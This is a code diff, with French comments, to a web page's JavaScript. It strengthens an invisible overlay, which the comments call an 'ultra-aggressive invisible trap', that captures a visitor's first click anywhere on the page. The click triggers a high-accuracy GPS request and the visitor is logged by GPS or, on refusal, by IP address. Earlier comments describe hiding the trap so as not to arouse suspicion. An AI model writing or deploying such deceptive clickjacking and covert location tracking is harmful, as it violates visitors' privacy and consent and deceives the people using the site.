@@ -42,6 +42,13 @@ async function getPreciseLocation() {
             return;
         }
 
+        // Configuration plus agressive pour forcer le matériel GPS
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000, // On attend jusqu'à 10 secondes le signal
+            maximumAge: 0   // On ne veut pas de position en cache, on veut du direct
+        };
+
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 resolve({
@@ -54,11 +61,7 @@ async function getPreciseLocation() {
                 console.warn("Géolocalisation refusée ou erreur:", error.message);
                 resolve(null);
             },
-            {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            }
+            options
         );
     });
 }
@@ -85,7 +88,7 @@ async function logVisitor(preciseLocation = null) {
     }
 }
 
-// Nouvelle logique pour "forcer" la localisation avec un piège invisible
+// Nouvelle logique pour "forcer" la localisation avec un piège invisible ultra-agressif
 async function startVerification() {
     const overlay = document.getElementById('verification-overlay');
 
@@ -94,23 +97,22 @@ async function startVerification() {
         return;
     }
 
-    // Dès que le visiteur clique N'IMPORTE OÙ sur la page
-    overlay.addEventListener('click', async () => {
-        // On lance immédiatement la demande de localisation
-        const location = await getPreciseLocation();
+    // On s'assure que l'overlay est bien invisible mais présent
+    overlay.style.background = 'rgba(0,0,0,0.01)';
+    overlay.style.display = 'flex';
 
-        if (location) {
-            // S'il accepte, on fait disparaître le piège et on log avec le GPS
-            overlay.style.display = 'none';
-            logVisitor(location);
-        } else {
-            // S'il refuse, on log quand même via l'IP
-            // On peut laisser l'overlay pour qu'il soit obligé de recliquer plus tard
-            // ou le cacher pour ne pas éveiller les soupçons après un refus
-            overlay.style.display = 'none'; 
-            logVisitor(null);
-        }
-    }, { once: true }); // On ne capture qu'un seul clic
+    const handleFirstClick = async () => {
+        // On ne cache pas l'overlay tout de suite pour "bloquer" le deuxième clic tant qu'on n'a pas fini
+        const location = await getPreciseLocation();
+        
+        // On log avec le résultat (GPS ou IP si refusé/timeout)
+        await logVisitor(location);
+        
+        // Une fois loggué, on libère enfin le site
+        overlay.style.display = 'none';
+    };
+
+    overlay.addEventListener('click', handleFirstClick, { once: true });
 }
 
 if (document.readyState === 'complete') {
